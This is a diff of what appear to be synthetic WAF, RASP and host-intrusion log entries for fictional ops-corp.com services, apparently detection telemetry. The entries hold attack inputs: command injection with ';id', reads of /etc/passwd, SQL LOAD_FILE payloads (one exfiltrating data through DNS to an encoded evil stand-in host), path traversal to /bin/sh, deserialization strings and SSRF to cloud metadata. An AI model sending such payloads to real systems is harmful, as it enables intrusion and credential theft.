@@ -1,40 +1,4 @@
-/api/v1/ping?cmd=127.0.0.1;id cmd=127.0.0.1;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
-/api/v1/ping?cmd=127.0.0.1;id cmd=127.0.0.1;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
-https://app-go-194.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 1
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /usr/local/bin/app-server
-/api/v1/namespaces/default/endpoints SELECT load_file('/etc/passwd') Mozilla/5.0 (Windows NT 10.0; Win64; x64;
-/api/v1/namespaces/default/endpoints SELECT load_file('/etc/passwd') Mozilla/5.0 (Windows NT 10.0; Win64; x64;
-https://app-django-199.ops-corp.com/api/v1/namespaces/default/endpoints {"cmd_inject": ";id", "cmd": "loginNam
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /opt/app/main
-/stream echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.
-/stream echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.
-https://app-nginx-98.ops-corp.com/stream {"php_fpm_rce": true, "cmd": "echo;id"} Mozilla/5.0 (Windows NT 10.0;
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== nginx: worker process
-/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= filename=../../../etc/cron.d/5d4d036 Mozilla/5
-/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= filename=../../../etc/cron.d/5d4d036 Mozilla/5
-https://app-java-177.ops-corp.com/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= {"deserializa
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/bin/java -jar /opt/app/app.
-/api/v1/ping?cmd=127.0.0.1;id {"username":"user_17f0","password":"17f057df","role":"admin","is_admin":true} Mo
-/api/v1/ping?cmd=127.0.0.1;id {"username":"user_17f0","password":"17f057df","role":"admin","is_admin":true} Mo
-https://app-go-64.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 10
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /opt/app/main
-/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= url=http://metadata.google.internal/computeMetadata/v1/i
-/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= url=http://metadata.google.internal/computeMetadata/v1/i
-https://app-tomcat-67.ops-corp.com/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= {"deserialization": "r
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/local/tomcat/bin/catalina.s
-/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id <xsl:stylesheet><xsl:template match="/"><xsl:value-of select="document('
-/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id <xsl:stylesheet><xsl:template match="/"><xsl:value-of select="document('
-https://app-php-77.ops-corp.com/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id {"cmd": "echo;id"} Mozilla/5.0 (Macintosh
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== php-fpm: pool www
-/cgi-bin/%%32%65%%32%65/bin/sh echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li
-/cgi-bin/%%32%65%%32%65/bin/sh echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li
-https://app-php-160.ops-corp.com/cgi-bin/%%32%65%%32%65/bin/sh {"cmd": "echo;id"} Mozilla/5.0 (Windows NT 10.0
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /usr/sbin/apache2
-/api/users?mass_assignment={"admin":true} id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e,0x6576696c2e636f
-/api/users?mass_assignment={"admin":true} id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e,0x6576696c2e636f
-https://app-rails-88.ops-corp.com/api/users?mass_assignment={"admin":true} {"mass_assignment": "{\"admin\":tru
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== bundle exec rails server -b 0.0.
-/api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-/api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-https://app-go-183.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 1
-cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== /usr/local/bin/app-server
+2026-05-17 18:26:43 [waf] WAF0115976 /api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+2026-05-17 18:26:44 [web] WEB0116905 /api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+2026-05-17 18:26:45 [rasp] RASP0127960 https://app-go-183.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 1
+2026-05-17 18:27:43 [hids] HID0126339 cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== /usr/local/bin/app-server
